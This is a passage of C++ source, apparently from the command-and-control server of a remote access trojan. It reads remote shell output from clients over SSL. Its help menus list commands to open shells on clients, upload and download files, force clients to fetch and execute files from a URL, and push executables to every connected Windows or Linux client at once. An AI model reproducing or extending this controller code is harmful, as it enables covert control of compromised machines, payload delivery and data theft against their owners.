			memset(cCmdBuffer, 0, 1024);
			iBytes = SSL_read(Clients[iClientID]->sslSocket, cCmdBuffer, 1023);
			if(iBytes > 0){
				cCmdBuffer[iBytes] = '\0';
				if(strncmp(cCmdBuffer, CommandCodes::cShellEnd, strlen(CommandCodes::cShellEnd)) == 0){
					std::cout<<"\nRemote shell ends\n";
					isReadingShell = false;
					break;
				}
				std::cout<<cCmdBuffer;
			} else if(iBytes == -1){
				std::cout<<"Socket error\n";
				error();
				break;
			}
		} else {
			std::cout<<"client doesnt exist or is not connected anymore\n";
			break;
		}
	}
}

void Server::Help(const std::string strHelp, int iOS){
	std::vector<std::string> vHeaders, vFields;
	if(strHelp == "main"){
		std::cout<<"cli - Command to interact with clients\n";
		std::cout<<"Options:\n";
		vHeaders.push_back("Parameter");
		vHeaders.push_back("About");
		vHeaders.push_back("Options");
		vFields.push_back("-l,Display connected users");
		vFields.push_back("-a,Action to run on selected client,interact / close");
		vFields.push_back("-c,Client to run selected action,number / *");
		Misc::PrintTable(vHeaders, vFields, ',');
		std::cout<<"Ej:  cli -c 0 -a interact\n";
		std::cout<<"     Start interactive session with client 0\n\n";
		std::cout<<"     cli -c 0 -a close\n";
		std::cout<<"     Close connection with client 0 and terminate remote process\n\n";
		std::cout<<"     cli -c *\n";
		std::cout<<"     Start interactive session with all connected clients\n";
		return;
	}
	if(strHelp == "client"){
		std::cout<<"Available commands\n";
		vHeaders.push_back("Command");
		vHeaders.push_back("About");
		vHeaders.push_back("Parameters");
		if(iOS == 1){
			vFields.push_back("shell,Start interactive shell with client,-c /path/to/shell");
			vFields.push_back("download,Download a remote file,-r /path/to/file");
			vFields.push_back("upload,Upload a local file to client,-l /path/to/localfile,-r /path/remotefile");
		} else {
			vFields.push_back("shell,Start interactive shell with client,-c C:\\path\\to\\shell.exe");
			vFields.push_back("download,Download a remote file,-r C:\\path\\to\\file.txt");
			vFields.push_back("upload,Upload a local file to client,-l /path/to/localfile,-r C:\\remote\\filename");
		}
		vFields.push_back("httpd,Force client to download file from a http/https server,-u url,-r yes/no (Execute)");
		vFields.push_back("info,Retrieve basic info from client,-b (Basic)");
		Misc::PrintTable(vHeaders, vFields, ',');
		return;
	}
	if(strHelp == "massive"){
		vHeaders.push_back("Command");
		vHeaders.push_back("About");
		vHeaders.push_back("Parameters");
		vFields.push_back("httpd,Force clients to download a file,-u url,-r yes/no,-o windows/linux/*");
		vFields.push_back("upload,Send file to all clients,-l /path/to/file,-r yes/no (Execute),-o windows/linux/*");
		Misc::PrintTable(vHeaders, vFields, ',');
		return;
	}
}

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
